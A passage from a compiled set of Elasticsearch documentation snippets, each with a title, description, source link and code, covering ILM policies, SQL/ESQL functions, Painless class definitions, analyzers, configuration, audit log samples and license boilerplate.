}\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring ILM Policy with Unfollow Action in Elasticsearch\nDESCRIPTION: Example of creating an ILM policy that includes the unfollow action in the hot phase. This policy will convert follower indices into regular indices when specific conditions are met, allowing for subsequent operations like shrink, rollover, and searchable snapshots.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-unfollow.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"hot\": {\n        \"actions\": {\n          \"unfollow\" : {}\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of ATAN Function Usage\nDESCRIPTION: Demonstrates that ATAN and TAN are inverse functions by showing that ATAN(TAN(90°)) equals 90°, using degree-radian conversions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_40\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DEGREES(ATAN(TAN(RADIANS(90))));\n\nDEGREES(ATAN(TAN(RADIANS(90))))\n-------------------------------\n90.0\n```\n\n----------------------------------------\n\nTITLE: Equality Equals with Null in Painless\nDESCRIPTION: Demonstrates the behavior of the equality equals operator when dealing with null values in Painless. It assigns null to two Object variables, compares them, then assigns a new Object to one variable, and compares them again, highlighting how '==' handles null comparisons.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_14\n\nLANGUAGE: painless\nCODE:\n```\n\"Object a = null;       <1>\nObject b = null;       <2>\nboolean c = a == null; <3>\nc = a == b;            <4>\nb = new Object();      <5>\nc = a == b;            <6>\"\n```\n\n----------------------------------------\n\nTITLE: Gregorian Calendar Implementation in Java\nDESCRIPTION: This snippet defines the GregorianCalendar class which extends the Calendar class to provide specific date and time functionalities for the Gregorian calendar. It includes constructors for different date representations and methods for converting to and from ZonedDateTime.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_17\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.GregorianCalendar {\n  int AD\n  int BC\n  ()\n  (int,int,int)\n  (int,int,int,int,int)\n  (int,int,int,int,int,int)\n  (TimeZone)\n  (TimeZone,Locale)\n  GregorianCalendar from(ZonedDateTime)\n  Date getGregorianChange()\n  boolean isLeapYear(int)\n  void setGregorianChange(Date)\n  ZonedDateTime toZonedDateTime()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Murmur3DocValueField Class in Java\nDESCRIPTION: This snippet defines the 'Murmur3DocValueField' class, which inherits from 'AbstractLongDocValuesField'. This class is intended to handle document values using the Murmur3 hashing algorithm for efficient storage and retrieval in Elasticsearch. The class is currently a placeholder and may include more functionalities in the future.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/mapper-murmur3/src/main/resources/org/elasticsearch/script/field/murmur3/org.elasticsearch.field.murmur3.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.field.murmur3.Murmur3DocValueField @dynamic_type {\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: A template for the copyright notice that should be included in files to apply the Apache License 2.0. The template includes placeholders for year and copyright owner information that should be replaced with actual project details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-azure/licenses/oauth2-oidc-sdk-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Implementing Version-Aware Parsing with ParseField in Elasticsearch\nDESCRIPTION: Example of using ParseField to handle both current and deprecated field names across different API versions. This allows the parser to match on the incoming payload based on the requested compatibility version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nPARSER.declareInt(MyPojo::setMax, new ParseField(\"maximum\", \"limit\").forRestApiVersion(RestApiVersion.equalTo(RestApiVersion.V_7)));\nPARSER.declareInt(MyPojo::setMax, new ParseField(\"maximum\").forRestApiVersion(RestApiVersion.onOrAfter(RestApiVersion.V_8)));\n```\n\n----------------------------------------\n\nTITLE: Querying User Identity and Access Control for Source1 in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to retrieve user identity and access control information for a specific user from the .search-acl-filter-source1 index in Elasticsearch. It includes the user's email, username, and access control groups.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-dls-overview.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nGET .search-acl-filter-source1\n{\n  \"_id\": \"example.user@example.com\",\n  \"identity\": {\n      \"username\": \"example username\",\n      \"email\": \"example.user@example.com\"\n   },\n   \"query\": {\n        \"template\": {\n            \"params\": {\n                \"access_control\": [\n                    \"example.user@example.com\",\n                    \"source1-user-group\"]\n            }\n        },\n        \"source\": \"...\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using SCORE for Sorting Results in Elasticsearch SQL\nDESCRIPTION: Example showing how to sort search results by relevance score in descending order to show most relevant matches first.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nSELECT SCORE(), * FROM library WHERE MATCH(name, 'dune') ORDER BY SCORE() DESC;\n\n    SCORE()    |    author     |       name        |  page_count   |    release_date\n---------------+---------------+-------------------+---------------+--------------------\n2.2886353      |Frank Herbert  |Dune               |604            |1965-06-01T00:00:00Z\n1.8893257      |Frank Herbert  |Dune Messiah       |331            |1969-10-15T00:00:00Z\n1.6086556      |Frank Herbert  |Children of Dune   |408            |1976-04-21T00:00:00Z\n1.4005898      |Frank Herbert  |God Emperor of Dune|454            |1981-05-28T00:00:00Z\n```\n\n----------------------------------------\n\nTITLE: Defining EnumConstantNotPresentException in Java\nDESCRIPTION: This snippet defines the java.lang.EnumConstantNotPresentException class, thrown when an application tries to access an enum constant by name and the enum type does not contain an element with the specified name. It includes a method `constantName()`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_32\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.EnumConstantNotPresentException {\n  String constantName()\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Hunspell Dictionary Directory Structure\nDESCRIPTION: Shows the expected directory structure for Hunspell dictionaries under the Elasticsearch config directory\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-hunspell-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: txt\nCODE:\n```\n- config\n    |-- hunspell\n    |    |-- en_US\n    |    |    |-- en_US.dic\n    |    |    |-- en_US.aff\n```\n\n----------------------------------------\n\nTITLE: Restricting Thread.getAllStackTraces() Usage\nDESCRIPTION: Warns that the getAllStackTraces method requires special permissions which may not be available in all environments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_12\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage this method needs special permission\njava.lang.Thread#getAllStackTraces()\n```\n\n----------------------------------------\n\nTITLE: Filter Output for Numeral Conversion\nDESCRIPTION: The output text produced by the mapping character filter after converting the Hindu-Arabic numerals.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-mapping-charfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ My license plate is 25015 ]\n```\n\n----------------------------------------\n\nTITLE: Class definition for LongFieldScript.Factory in Elasticsearch Painless\nDESCRIPTION: Defines the `LongFieldScript$Factory` class, a factory for `LongFieldScript` instances. This class is also annotated with `@no_import` to prevent automatic importing in Painless scripts. This class is used to instantiate LongFieldScript objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.long_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.script.LongFieldScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Slack Notification Settings in elasticsearch.yml\nDESCRIPTION: YAML configuration for Slack notifications in Elasticsearch. Includes settings for default account, secure webhook URL, and message defaults like sender name, destination channels, icon, and message content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_34\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.notification.slack: # Configures Slack notification settings\nxpack.notification.slack.default_account: \"my_account\" # Default Slack account to use\nxpack.notification.slack.account:\n  secure_url: # The Incoming Webhook URL (must be added to keystore)\n  message_defaults:\n    from: \"watch_name\" # Sender name to display (defaults to watch ID)\n    to: \"#channel_name\" # Default channels or groups\n    icon: \"https://example.com/icon.png\" # Icon to display in messages\n    text: \"Default message\" # Default message content\n    attachment: # Array of message attachments as defined in Slack docs\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Classic Token Filter\nDESCRIPTION: Shows how to configure a custom analyzer using the classic token filter in an Elasticsearch index creation request\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-classic-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /classic_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"classic_analyzer\": {\n          \"tokenizer\": \"classic\",\n          \"filter\": [ \"classic\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Valid Reference Type Casts in Painless\nDESCRIPTION: Examples of valid reference type casts in Painless, showing implicit and explicit casts between related types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nList x;                        \nArrayList y = new ArrayList(); \nx = y;                         \ny = (ArrayList)x;              \nx = (List)y;                   \n```\n\n----------------------------------------\n\nTITLE: Creating PKCS12 Keystore with a Single Entry\nDESCRIPTION: Imports a specific key alias from a JKS keystore into a PKCS12 keystore format using the keytool command, focusing on 'signing1'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/identity-provider/src/test/resources/org/elasticsearch/xpack/idp/saml/idp/README.txt#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nkeytool -importkeystore -srckeystore multi_signing.jks  -destkeystore signing.p12 -deststoretype PKCS12 -deststorepass signing -destkeypass signing -alias signing1\n```\n\n----------------------------------------\n\nTITLE: Reset Native User Password with Custom URL\nDESCRIPTION: Example showing how to reset a native user's password while specifying a custom URL for the Elasticsearch node connection.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/reset-password.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-reset-password --url \"https://172.0.0.3:9200\" --username user2 -i\n```\n\n----------------------------------------\n\nTITLE: Creating Docker Volume\nDESCRIPTION: This command creates a Docker volume named `extraction-service-volume`, which will be shared between the self-managed connector and the extraction service containers for accessing the files to be extracted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ docker volume create --name extraction-service-volume\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for Suffix Pattern Matching in ESQL\nDESCRIPTION: This markdown table defines the supported input types and result types for suffix pattern matching operations in Elasticsearch SQL. It covers combinations of keyword and text types for both the string and suffix arguments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/ends_with.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| str | suffix | result |\n| --- | --- | --- |\n| keyword | keyword | boolean |\n| keyword | text | boolean |\n| text | keyword | boolean |\n| text | text | boolean |\n```\n\n----------------------------------------\n\nTITLE: Searching and Highlighting Using Index Prefixes in Elasticsearch\nDESCRIPTION: This example shows how to perform a prefix search query and highlight the results using the automatically created '._index_prefix' subfield. The matched_fields parameter is used to highlight the main field based on matches found in the prefix field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/index-prefixes.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"prefix\": {\n      \"full_name\": {\n        \"value\": \"ki\"\n      }\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"full_name\": {\n        \"matched_fields\": [\"full_name._index_prefix\"]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: NVL Function\nDESCRIPTION: Another two-argument variant of COALESCE that returns the second expression if the first is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-conditional.md#2025-04-21_snippet_9\n\nLANGUAGE: sql\nCODE:\n```\nNVL(\n    expression,\n    expression)\n```\n\n----------------------------------------\n\nTITLE: Boolean Parsing Recommendation\nDESCRIPTION: Advises against using Boolean.getBoolean() which can be misleading due to its lenient parsing behavior. Recommends using org.elasticsearch.core.Booleans#parseBoolean instead for more predictable results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n# This method is misleading, and uses lenient boolean parsing under the hood. If you intend to parse\n# a system property as a boolean, use\n# org.elasticsearch.core.Booleans#parseBoolean(java.lang.String) on the result of\n# java.lang.SystemProperty#getProperty(java.lang.String) instead. If you were not intending to parse\n# a system property as a boolean, but instead parse a string to a boolean, use\n# org.elasticsearch.core.Booleans#parseBoolean(java.lang.String) directly on the string.\n@defaultMessage use org.elasticsearch.core.Booleans#parseBoolean(java.lang.String)\njava.lang.Boolean#getBoolean(java.lang.String)\n```\n\n----------------------------------------\n\nTITLE: Restricted Executor Service Creation\nDESCRIPTION: Lists executor service constructors that should be avoided in favor of Elasticsearch's custom executors which properly handle error propagation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_6\n\nLANGUAGE: java\nCODE:\n```\n@defaultMessage use executors from org.elasticsearch.common.util.concurrent.EsExecutors instead which will properly bubble up Errors\njava.util.concurrent.AbstractExecutorService#<init>()\njava.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue)\njava.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue, java.util.concurrent.ThreadFactory)\njava.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue, java.util.concurrent.RejectedExecutionHandler)\njava.util.concurrent.ThreadPoolExecutor#<init>(int, int, long, java.util.concurrent.TimeUnit, java.util.concurrent.BlockingQueue, java.util.concurrent.ThreadFactory, java.util.concurrent.RejectedExecutionHandler)\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: This snippet provides a template for the boilerplate notice to be included when applying the Apache License 2.0 to a software project. It includes placeholders for the copyright year and owner, and specifies the terms of the license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/rest/licenses/httpcore-nio-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Using LENGTH Function in ESQL to Calculate String Length\nDESCRIPTION: This ESQL query filters airport data for Indian cities, retains only the city field, and adds a new column that computes the length of each city name using the LENGTH function. The results show three Indian cities with their respective character lengths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/length.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| KEEP city\n| EVAL fn_length = LENGTH(city)\n```\n\n----------------------------------------\n\nTITLE: Processed URI Output Document\nDESCRIPTION: Result document showing the parsed URI components including scheme, domain, path, query parameters, and authentication details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/uri-parts-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n\"_source\" : {\n  \"input_field\" : \"http://myusername:mypassword@www.example.com:80/foo.gif?key1=val1&key2=val2#fragment\",\n  \"url\" : {\n    \"path\" : \"/foo.gif\",\n    \"fragment\" : \"fragment\",\n    \"extension\" : \"gif\",\n    \"password\" : \"mypassword\",\n    \"original\" : \"http://myusername:mypassword@www.example.com:80/foo.gif?key1=val1&key2=val2#fragment\",\n    \"scheme\" : \"http\",\n    \"port\" : 80,\n    \"user_info\" : \"myusername:mypassword\",\n    \"domain\" : \"www.example.com\",\n    \"query\" : \"key1=val1&key2=val2\",\n    \"username\" : \"myusername\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining java.util.Deque Methods in Painless\nDESCRIPTION: This snippet defines methods for the java.util.Deque interface, providing a double-ended queue structure within the Painless scripting language. It allows adding and removing elements from both ends of the deque.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass java.util.Deque {\n  void addFirst(def)\n  void addLast(def)\n  Iterator descendingIterator()\n  def getFirst()\n  def getLast()\n  boolean offerFirst(def)\n  boolean offerLast(def)\n  def peekFirst()\n  def peekLast()\n  def pollFirst()\n  def pollLast()\n  def pop()\n  void push(def)\n  boolean remove(def)\n  def removeFirst()\n  boolean removeFirstOccurrence(def)\n  def removeLast()\n  boolean removeLastOccurrence(def)\n}\n```\n\n----------------------------------------\n\nTITLE: Applying GPL Notice to Source Files\nDESCRIPTION: A template for adding GPL notices to source files of a program. It includes copyright information, license terms, and warranty disclaimers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-pdf-module-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\nOne line to give the program's name and a brief idea of what it does.\nCopyright (C) <year> <name of author>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\nGeneral Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\n```\n\n----------------------------------------\n\nTITLE: Evaluating Transform Plugin Projects (File: build.gradle)\nDESCRIPTION: This snippet evaluates transformation plugin QA scenarios, including common configurations, multi-cluster tests with security, and single-node tests. Each project is verified using its respective Gradle build file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_10\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:transform:qa:common\nEvaluating project ':x-pack:plugin:transform:qa:common' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/transform/qa/common/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:transform:qa:multi-cluster-tests-with-security\nEvaluating project ':x-pack:plugin:transform:qa:multi-cluster-tests-with-security' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/transform/qa/multi-cluster-tests-with-security/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:transform:qa:multi-node-tests\nEvaluating project ':x-pack:plugin:transform:qa:multi-node-tests' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/transform/qa/multi-node-tests/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:transform:qa:single-node-tests\nEvaluating project ':x-pack:plugin:transform:qa:single-node-tests' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/transform/qa/single-node-tests/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Creating GCE Instance with Custom Elasticsearch Port\nDESCRIPTION: This snippet demonstrates how to create a new Google Compute Engine instance with a custom Elasticsearch port specified in the metadata. It includes examples for creating a new instance from scratch and from an existing image.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-port.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\n# when creating first instance\ngcloud compute instances create myesnode1 \\\n       --scopes=compute-rw,storage-full \\\n       --metadata es_port=9301\n\n# when creating an instance from an image\ngcloud compute instances create myesnode2 --image=elasticsearch-1-0-0-RC1 \\\n       --zone europe-west1-a --machine-type f1-micro --scopes=compute-rw \\\n       --metadata es_port=9301\n```\n\n----------------------------------------\n\nTITLE: Simulation Response for Date Index Name Pipeline in Elasticsearch\nDESCRIPTION: The simulation response shows the date math expression used for the _index field, revealing how Elasticsearch interprets time-based index patterns before resolving them to actual index names.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/date-index-name-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"docs\" : [\n    {\n      \"doc\" : {\n        \"_id\" : \"_id\",\n        \"_index\" : \"<my-index-{2016-04-25||/M{yyyy-MM-dd|UTC}}>\",\n        \"_version\" : \"-3\",\n        \"_source\" : {\n          \"date1\" : \"2016-04-25T12:02:01.789Z\"\n        },\n        \"_ingest\" : {\n          \"timestamp\" : \"2016-11-08T19:43:03.850+0000\"\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Bitwise XOR Operation with Different Integer Types\nDESCRIPTION: Example showing bitwise XOR operations between values of different integer types. The snippet demonstrates type promotion from int to long and how the operations are evaluated.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_33\n\nLANGUAGE: painless\nCODE:\n```\nint i = 5 ^ 6;   <1>\nlong l = i ^ 5L; <2>\n```\n\n----------------------------------------\n\nTITLE: Applying Apache License 2.0 Boilerplate Notice\nDESCRIPTION: The standard boilerplate notice that should be included in files to apply the Apache License 2.0. It includes placeholders for copyright information and standard license text referencing where to find the complete license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/jcip-annotations-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n   Copyright [yyyy] [name of copyright owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Plugins with YAML Configuration File\nDESCRIPTION: Example of an elasticsearch-plugins.yml file that installs two official plugins (analysis-icu and repository-azure) and one unofficial plugin from a custom URL. Each plugin requires an ID, and unofficial plugins must also specify a location URL or Maven coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/manage-plugins-using-configuration-file.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nplugins:\n  - id: analysis-icu\n  - id: repository-azure\n  - id: custom-mapper\n    location: https://example.com/archive/custom-mapper-1.0.0.zip\n```\n\n----------------------------------------\n\nTITLE: Analyzing Japanese Text with Kuromoji Completion Filter\nDESCRIPTION: Demonstrates how to use the kuromoji_completion analyzer to process Japanese text. The example shows analyzing the word '寿司' (sushi), which returns both the original token and its romanized forms in Kunrei-shiki (susi) and Hepburn-shiki (sushi) formats.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-kuromoji-completion.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"analyzer\": \"kuromoji_completion\",\n  \"text\": \"寿司\"\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Eager Global Ordinals in Elasticsearch Mapping\nDESCRIPTION: This snippet shows how to enable eager global ordinals on a keyword field named 'tags' through a mapping update. When enabled, global ordinals are built when a shard is refreshed rather than at search time, optimizing for search performance at the cost of slower indexing.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/eager-global-ordinals.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-000001/_mapping\n{\n  \"properties\": {\n    \"tags\": {\n      \"type\": \"keyword\",\n      \"eager_global_ordinals\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Logging put_privileges Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the create or update privileges event. This event is logged when the API is invoked to add or update one or more application privileges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-31T00:39:07,779+0200\", \"node.id\":\n\"9clhpgjJRR-iKzOw20xBNQ\", \"event.type\":\"security_config_change\",\n\"event.action\":\"put_privileges\", \"request.id\":\"1X2VVtNgRYO7FmE0nR_BGA\",\n\"put\":{\"privileges\":[{\"application\":\"myapp\",\"name\":\"read\",\"actions\":\n[\"data:read/*\",\"action:login\"],\"metadata\":{\"description\":\"Read access to myapp\"}}]}}\n```\n\n----------------------------------------\n\nTITLE: Input File Format for Public Callers Finder\nDESCRIPTION: This section describes the required format of the input CSV file that the Public Callers Finder tool uses. The file should consist of several columns indicating module name, class name, method name, and visibility among others, separated by TAB.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/public-callers-finder/README.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nModule name\n1. unused\n2. unused\n3. unused\n4. Fully qualified class name (ASM style, with `/` separators)\n5. Method name\n6. Method descriptor (ASM signature)\n7. Visibility (PUBLIC/PUBLIC-METHOD/PRIVATE)\n```\n\n----------------------------------------\n\nTITLE: Using wildcard fields with synthetic _source in Elasticsearch\nDESCRIPTION: Shows how synthetic _source handles wildcard field values by automatically sorting and deduplicating them when retrieving documents. This example demonstrates the transformation of an array field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"card\": { \"type\": \"wildcard\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"card\": [\"king\", \"ace\", \"ace\", \"jack\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Moman/Finenight FSA Copyright Notice\nDESCRIPTION: MIT License notice for the moman/finenight FSA package used to generate levenshtein automata tables in Lucene's automaton package.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-nori/licenses/lucene-LICENSE.txt#2025-04-21_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# Copyright (c) 2010, Jean-Philippe Barrette-LaPierre, <jpb@rrette.com>\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation\n# files (the \"Software\"), to deal in the Software without\n# restriction, including without limitation the rights to use,\n# copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the\n# Software is furnished to do so, subject to the following\n# conditions:\n#\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# 